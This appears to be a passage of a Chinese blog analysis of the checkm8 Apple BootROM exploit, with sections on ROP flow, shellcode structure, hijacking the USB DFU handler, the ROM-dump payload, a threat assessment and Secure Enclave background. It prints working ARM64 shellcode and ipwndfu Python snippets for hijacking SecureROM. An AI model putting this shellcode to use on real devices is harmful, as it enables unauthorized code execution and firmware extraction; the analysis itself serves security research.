三个hook函数的作用是，执行到特定的地址就触发ret_hook动作。

ret_hook的作用是跳过函数或者某些语句的执行，这里是：

0x10000a4b8 — enter_critical_section 屏幕中断

0x10000a514 — exit_critical_section 恢复中断

0x1820b0610 — disable_wxn_arm64 关闭WXN

这些位置并不影响ROP的往下推进，为了简化过程，选择跳过这些函数。

点击“Initiate”按钮可以看到寄存器的值被设置。

![截屏2025-03-11 11.36.32.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_11.36.32.png)

- 单步观察

usb_core_complete_endpoint_io最终调用了fake usb_device_io_request::callback

```c
synopsys_otg_abort_endpoint;
         usb_core_complete_endpoint_io;
				         io_req->callback(io_req);
```

停在io_req→callback(io_req)观察，此时栈上面的返回地址为0x1000055D0，是usb_core_complete_endpoint_io函数的while(aborted_list)循环的起始位置。

X0是位于INSECURE_MEMORY的伪造usb_device_io_request对象，

X8是callback指针，指向“f(x)”指令片段。

![截屏2025-03-11 14.20.54.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.20.54.png)

进入“f(x)”指令片段，X0 = 0x1800b0600， X10 = t8010_dc_civac，

等效于t8010_dc_civac(0x1800b0600)。

![截屏2025-03-11 14.34.15.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.34.15.png)

运行到“f(x)”指令的结束部分，返回地址出栈，保存到X30寄存器，

ret之后返回到synopsys_otg_abort_endpoint函数的while(aborted_list)循环，进行下一条gadget的执行，这样就避免了free一个损坏的堆块引发panic。

![截屏2025-03-11 14.41.21.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.41.21.png)

- ROP结束状态

X10 = 0x1800B0000，保存t8010_shellcode，通过B指令跳转过去执行。

![截屏2025-03-11 14.55.10.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.55.10.png)

# shellcode执行

1. shellcode的结构

shellcode的构造函数如下：

```python
t8010_handler = asm_arm64_x7_trampoline(t8010_handle_interface_request) + \
								asm_arm64_branch(0x10, 0x0) + \
								prepare_shellcode('usb_0xA1_2_arm64', constants_usb_t8010)[4:]
								
t8010_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8010)

t8010_shellcode = t8010_shellcode + \
									'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + \
									t8010_handler
```

shellcode短小精悍，使用1024字节实现了USB序列号修改、劫持USB处理句柄、把USB功能代码拷贝到BOOT_TRAMPOLINE内存区域、USB功能代码这4个功能。

![checkm8-纯shellcode.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%BA%AFshellcode.jpg)

1. 恢复USB配置描述符

SecureROM初始化阶段为2个USB配置描述符在堆上分配空间，地址分别保存在usb_core_hs_configuration_descriptor和usb_core_fs_configuration_descriptor两个全局变量中。

```c
static u_int8_t *usb_core_hs_configuration_descriptor;
static u_int8_t *usb_core_fs_configuration_descriptor;

int usb_core_start(){
		......
    usb_core_hs_configuration_descriptor = (u_int8_t *)malloc(total_len);
    usb_core_fs_configuration_descriptor = (u_int8_t *)malloc(total_len);
    ......
}
```

两个全局变量在内存中的位置相邻，位于0x180088A30和0x180088A38。

![截屏2025-03-11 19.42.26.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_19.42.26.png)

在控制流劫持过程中，覆盖usb_device_io_request对象的同时，也破坏了堆上面的hs_configuration和fs_configuration对象。这两个对象的内容在编译时确定，因此可以把原有的内容手动复制回去。

```c
.text
.set gUSBDescriptors,              0x180088A30

LDR  X0, =gUSBDescriptors
LDP  X0, X1, [X0]   //X0 = usb_core_hs_configuration_descriptor, X1=usb_core_fs_configuration_descriptor
ADR  X2, USB_DESCRIPTOR
LDP  X3, X4, [X2]       //恢复usb_core_hs_configuration_descriptor和usb_core_fs_configuration_descriptor
STP  X3, X4, [X0]       //一共32字节
STP  X3, X4, [X1]
LDP  X3, X4, [X2,#0x10]
STP  X3, X4, [X0,#0x10]
STP  X3, X4, [X1,#0x10]

USB_DESCRIPTOR:
.word 0x190209, 0x80050101, 0x409fa, 0x1fe0000, 0x21070000, 0xa01, 0x8, 0x0
```

1. ”     PWND:[checkm8]“

首先找到序列号字符串的结束符，再把" PWND:[checkm8]"字符串拷贝到原始序列号末尾，得到新的序列号字符串。

调用usb_create_string_descriptor(gUSBSerialNumber)生成新的序列号描述符。

```c
.text
.pool
.set gUSBSerialNumber,             0x180083CF8
.set usb_create_string_descriptor, 0x10000D150
.set gUSBSRNMStringDescriptor,     0x1800805DA

 	LDR  X0, =gUSBSerialNumber
find_zero_loop:
  ADD  X0, X0, #1
  LDRB W1, [X0]
  CBNZ W1, find_zero_loop //找到序列号的结束符\x00

  ADR  X1, PWND_STRING
  LDP  X2, X3, [X1]
  STP  X2, X3, [X0]       //把" PWND:[checkm8]"字符串拷贝到原始序列号末尾

  LDR  X0, =gUSBSerialNumber
  LDR  X1, =usb_create_string_descriptor
  BLR  X1         //usb_create_string_descriptor(gUSBSerialNumber)，返回下标

  LDR  X1, =gUSBSRNMStringDescriptor //usb_core_device_descriptor.iSerialNumber
  STRB W0, [X1]   //把新的序列号描述符下标保存到usb_core_device_descriptor.iSerialNumber字段
									//以上我们就能在设备管理器中看到iphone设备的序列号末尾被加上了" PWND:[checkm8]"

PWND_STRING:
.asciz " PWND:[checkm8]"
```

usb_create_string_descriptor函数把生成的序列号描述符保存在usb_core_string_descriptor全局数组中，返回数组下标。

![截屏2025-03-11 20.17.25.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_20.17.25.png)

最后把数组下标设置到全局对象usb_core_device_descriptor的iSerialNumber字段，篡改后的序列号就对外可见了。

![checkm8-第 15 页.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5%201.jpg)

主机端查看USB设备信息，发现iPhone设备的序列号被修改了。

![截屏2025-03-06 20.00.32.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-06_20.00.32.png)

1. 劫持USB报文处理句柄

全局对象usb_dfu_interface_instance的handle_request指向的函数实现了USB DFU协议栈，负责处理主机发送的bmRequestType=0x21的Setup Transaction。

shellcode通过将handle_request函数指针覆盖为攻击者自定义的函数即可劫持对DFU请求的处理。

![checkm8-第 15 页.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5%202.jpg)

![截屏2025-03-11 20.36.08.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_20.36.08.png)

shellcode把usb_dfu_interface_instance.handle_request覆盖为0x1800AFC18，该地址位于BOOT_TRAMPOLINE内存区域，经过前面关闭WXN操作之后具有RWX权限。

shellcode中绿色部分是攻击者自定义的USB功能代码，将被拷贝到0x1800AFC18开始的区域。

```c
.text

.pool
.set PAYLOAD_OFFSET,               384
.set PAYLOAD_SIZE,                 576
.set PAYLOAD_DEST,                 0x1800AFC00
.set PAYLOAD_PTR,                  0x180088B48
  
  LDR  X0, =PAYLOAD_DEST    //0x1800AFC00
  ADR  X1, _main
  LDR  X2, =PAYLOAD_OFFSET  //384
  ADD  X1, X1, X2           //X1 就是蓝色和绿色阶段的起始地址
  MOV  X2, #0
  LDR  X3, =PAYLOAD_SIZE    //576
  LDR  X4, =PAYLOAD_PTR     //0x180088B48，usb_dfu_interface_instance.handle_request函数指针
  ADD  X5, X0, #0x18        //绿色部分，处理usb报文格式，从usb_0xA1_2_arm64.S的LDRH W2, [X0]开始执行
  STR  X5, [X4]             //覆盖usb_dfu_interface_instance.handle_request函数指针，劫持usb数据包处理句柄
                            //usb数据包被导向绿色部分
```

![checkm8-纯shellcode.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%BA%AFshellcode.jpg)

1. 拷贝USB功能代码

shellcode中的蓝色和绿色部分被拷贝到BOOT_TRAMPOLINE内存区域。

```c
copy_loop:
  LDP  X3, X4,  [X1]        //把蓝色和绿色阶段拷贝到0x1800AFC00 tramploit页面
  STP  X3, X4,  [X0]        //X0 = 0x1800AFC00 其中前0x18字节是蓝色阶段，绿色阶段是usb处理句柄
  LDP  X3, X4,  [X1,#0x10]
  STP  X3, X4,  [X0,#0x10]
  LDP  X3, X4,  [X1,#0x20]
  STP  X3, X4,  [X0,#0x20]
  LDP  X3, X4,  [X1,#0x30]
  STP  X3, X4,  [X0,#0x30]
  DC   CIVAC, X0            //清除X0指向的内存地址的缓存
  DMB  SY                   //屏障指令
  ADD  X0, X0, #0x40        //dst += 0x40
  ADD  X1, X1, #0x40        //src += 0x40
  ADD  X2, X2, #0x40        //count += 0x40
  CMP  X2, X3               //如果count < size，向前跳转
  B.CC copy_loop
```

47000058E0001FD6是“LDR X7, [PC, #8]; BR X7”汇编指令的机器码。

0x17FFFFFC是“B #-10”汇编指令的机器码。

![checkm8-shellcode包含usb功能代码.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-shellcode%E5%8C%85%E5%90%ABusb%E5%8A%9F%E8%83%BD%E4%BB%A3%E7%A0%81.jpg)

完成代码拷贝后清空流水线，确保CPU能正确加载运行USB功能代码。

最后返回SecureROM，shellcode的任务完成。

后面设备一旦接收到USB DFU数据包，便会被劫持到攻击者自定义的代码中，实现各种功能，例如把SecureROM整个dump出来、把iPhone设备的安全性降级等等。

```c
 SYS  #0, c7, c5, #0       //IC IALLUIS，修改代码或加载新代码后，确保所有核心使用最新的指令，而不是旧的缓存指令。
 DSB  SY                   //屏障指令
 ISB                       //清空处理器流水线，确保后续指令从内存中重新加载
                            //3条指令通常组合使用，确保在多核系统中内存和指令缓存的一致性
 LDP  X29, X30, [SP],#0x10 //返回SecureROM
 RET
```

# 功能扩展

1. 自定义USB报文处理句柄

上面提到，shellcode把usb_dfu_interface_instance.handle_request覆盖为0x1800AFC18。该指针原来指向handle_interface_request函数，实现了DFU下载功能。

```c
static int handle_interface_request(struct usb_device_request *request, 
								uint8_t **out_buffer);
```

bmRequestType=0xa1且bRequest=2是攻击者自定义的恶意功能指令。

若收到的是正常的DFU数据包，则通过0x1800AC000 ~ 0x1800AC014这段跳板代码路由到正常的处理逻辑，把数据包交给handle_interface_request函数处理。

![截屏2025-03-12 08.16.25.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_08.16.25.png)

1. 对正常DFU报文的处理

以—dump-rom参数的实现为例子，主机首先向设备发送正常的DFU请求，其中bmRequestType=0x21， bRequest=1。该请求经过跳板代码路由到handle_interface_request函数处理。其中data参数包含了将要dump的地址范围，设备接收到data参数之后保存在0x1800B0000。

```python
def send_data(device, data):
    #print 'Sending 0x%x of data to device.' % len(data)
    index = 0
    while index < len(data):
        amount = min(len(data) - index, MAX_PACKET_SIZE)
        assert device.ctrl_transfer(0x21, 1, 0, 0, data[index:index + amount], 5000) == amount
        index += amount
```

1. 对攻击指令的处理

接着主机向设备发送恶意功能指令，其中bmRequestType=0xa1，bRequest=2，wValue=0xFFFF，该数据包交给USB功能代码处理。

```python
response = device.ctrl_transfer(0xA1, 2, 0xFFFF, 0, response_length, \
						CMD_TIMEOUT).tostring()
```

若wValue=0xFFFF，

从0x1800B0000读取保存的参数，根据参数的前8个字节判断要执行的指令。

—dump-rom的magic是“memcmemc”。

```c
STP  X29, X30, [SP,#-0x10]!   ; 保存fp 、lr
MOV  X29, SP
STP  X20, X19, [SP,#-0x10]!

MOV  X19, X0            ; usb_device_request
LDR  X20, =LOAD_ADDRESS ; 0x1800B0000, 全局指针image_buffer，
												;在正常情况下保存接收到的dfu镜像, 系统被劫持后保存攻击者请求参数
MOV  W1, #0xFFFF
LDRH W2, [X19,#2]       ;if(request->wValue != 0xffff) goto request_done
CMP  W1, W2
BNE  request_done       ; 如果request->wValue == 0xffff, 那就执行功能代码

LDR  X0, [X20]          ; X0 = LOAD_ADDRESS[0], 取出magic number, 判断是哪条命令
```

—dump-rom调用自定义的memcpy函数，把固件代码段拷贝到0x1800B0000，并且在头部加上“donedone”字符串表示成功执行。

```c
; --dump-rom功能的实现

STR  XZR, [X20]     

LDP  X0, X1, [X20, #0x10]    ; X0=dest, X1=src
LDR  X2, [X20, #0x20]        ; X2=length
BL   memcpy

LDR  X8, =DONE_MAGIC
STR  X8, [X20]               ; 消息头部加上DONE标识
B    request_done            ; 加入传输队列
```

最后调用usb_core_do_transfer(EP0_IN, 0x1800B0000, wLength, 0)创建一个IO任务加入EP0_IN端点的任务队列中，把获取到的固件发送给主机。

```c
request_done:
  MOV  W0, #0x80            ; EP0_IN
  MOV  X1, X20              ; LOAD_ADDRESS 0x1800B0000
  LDRH W2, [X19,#6]         ; request->wLength
  MOV  X3, #0               ; 0
  LDR  X4, =USB_CORE_DO_IO  ; usb_core_do_transfer
  BLR  X4

  MOV  W0, #0
  LDP  X20, X19, [SP],#0x10
  LDP  X29, X30, [SP],#0x10
  RET
```

# 事件回顾

## checkm8**能力及威胁评估**

- 漏洞具备的能力
    - checkm8位于BootROM中，不可被修复
    - 在BootROM中具备任意代码执行能力，提供了越狱的能力
    - 开启CPU的JTAG调试功能，使研究人员可以对苹果设备进行更加深入的研究
    - 控制iBoot的解密过程，从内存中提取解密后的iBoot
    - 硬件漏洞的生命周期很长，是当前越狱老版本苹果设备的主要办法，如果是软件漏洞可能几天就被补上了

- 漏洞的局限性
    - 需要使用USB物理访问手机，无法远程执行
    - 只能在手机引导时进行操作，仅存在于运行时内存，重启后恢复原样
    - ipwndfu集成的checkm8目前只是漏洞利用工具，并不具备越狱功能
    - 无法突破用户数据的加密保护，文件系统、用户数据和生物ID被Secure Enclave加密保护

iPhone安全性的一些小知识：

**SEP**（Secure Enclave Processor，安全区域处理器）是iPhone和其他苹果设备中的一个独立硬件安全模块，专门用于处理和保护敏感数据。它是苹果设备安全架构的核心组成部分，与A系列芯片紧密结合。

**SEP的作用：**

1. **存储和处理敏感数据**：
    - **生物识别数据**：如Touch ID的指纹信息和Face ID的面容信息。
    - **支付信息**：如Apple Pay的支付令牌和加密密钥。
    - **密码和密钥**：如设备解锁密码、文件加密密钥等。
2. **加密和安全操作**：
    - 生成和存储设备唯一的加密密钥（基于UID）。
    - 执行加密和解密操作，确保数据在传输和存储过程中的安全性。
    - 管理设备的激活锁（Activation Lock）和查找我的iPhone（Find My iPhone）功能。
3. **隔离和保护**：
    - SEP是一个独立的协处理器，与主处理器（CPU）隔离，确保即使主系统被攻破，SEP中的数据仍然安全。
    - 它有自己的安全启动过程和固件，防止未经授权的访问。
4. **验证和认证**：
    - 验证Touch ID和Face ID的合法性，确保只有授权用户可以访问设备。
    - 在Apple Pay交易中，验证支付请求的合法性并生成动态安全码。
    

**SEP的工作原理**

1. **硬件隔离**：
    - SEP是一个独立的硬件模块，集成在A系列芯片中。
    - 它与主处理器通过加密通道通信，确保数据在传输过程中不被窃取或篡改。
2. **唯一密钥（UID）**：
    - 每个SEP都有一个基于设备UID的唯一加密密钥。
    - 这些密钥用于加密和解密SEP中的数据，且无法被导出或复制。
3. **安全启动**：
    - SEP有自己的安全启动过程，确保其固件未被篡改。
    - 只有在验证固件签名后，SEP才会启动。
4. **防暴力破解**：
    - SEP具有防暴力破解机制，例如在多次错误的指纹或面容识别尝试后，会锁定生物识别功能。
    - 它还支持延迟响应和擦除数据功能，进一步增强安全性。

**SEP的应用场景**

1. **Touch ID和Face ID**：
    - SEP存储和处理生物识别数据，确保这些数据不会被泄露或滥用。
    - 它还会验证生物识别的合法性，防止伪造或欺骗。
2. **Apple Pay**：
    - SEP生成和管理支付令牌，确保支付过程的安全性。
    - 它还会验证支付请求的合法性，并生成动态安全码。
3. **设备加密**：
    - SEP管理设备文件系统的加密密钥，确保用户数据在设备丢失或被盗时不会被访问。
4. **激活锁和查找我的iPhone**：
    - SEP与设备的激活锁绑定，确保即使设备被擦除，也无法绕过Apple ID激活。

**SEP的安全性**

1. **硬件级保护**：
    - SEP是一个独立的硬件模块，与主系统隔离，防止软件攻击。
2. **加密通信**：
    - 所有与SEP的通信都经过加密，防止数据被窃取或篡改。
3. **防物理攻击**：
    - SEP的设计考虑了物理攻击的防护，例如侧信道攻击和硬件拆解。

---

[安全隔区](https://support.apple.com/zh-cn/guide/security/sec59b0b31ff/web)

## 事件后续

- 苹果官方处理

迅速采取法律手段，要求GitHub和其他平台删除泄漏的源码。

要求相关方遵守《数字千年版权法案》（[DMCA](https://zh.wikipedia.org/zh-cn/%E6%95%B8%E5%AD%97%E5%8D%83%E5%B9%B4%E7%89%88%E6%AC%8A%E6%B3%95)）

- 后续有人申请了漏洞编号[CVE-2019-8900](https://www.kb.cert.org/vuls/id/941987/)

- 事了拂衣去，深藏功与名

各国情报部门、军队、安全研究人员、果粉、越狱爱好者和吃瓜群众的狂欢

![EG91kipUEAAtlh4.jpeg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/EG91kipUEAAtlh4.jpeg)

# 参考资料

[Checkm8 漏洞研究](https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/)

[Technical analysis of the checkm8 exploit](https://habr.com/en/companies/dsec/articles/472762/)

[A comprehensive write-up of the checkm8 BootROM exploit](https://alfiecg.uk/2023/07/21/A-comprehensive-write-up-of-the-checkm8-BootROM-exploit.html#usb-initialisation)

[Exploiting the iPhone 4, Part 1: Gaining Entry](https://axleos.com/exploiting-the-iphone-4-part-1-gaining-entry/)

[iBoot堆结构](https://re.alisa.sh/notes/iBoot-heap-internals.html)

[iBoot地址空间](https://re.alisa.sh/notes/iBoot-address-space.html)

[*OS Internals: - Welcome! 这个论坛介绍了很多iOS知识👍](https://newosxbook.com/home.html)

[iPhone Wiki 这里面包含了很多漏洞利用知识和代码](https://www.theiphonewiki.com/)

[USB中文网](https://www.usbzh.com/)

# 附件

[堆模拟器.zip](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E5%A0%86%E6%A8%A1%E6%8B%9F%E5%99%A8.zip)

[uEmu-master.zip](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/uEmu-master.zip)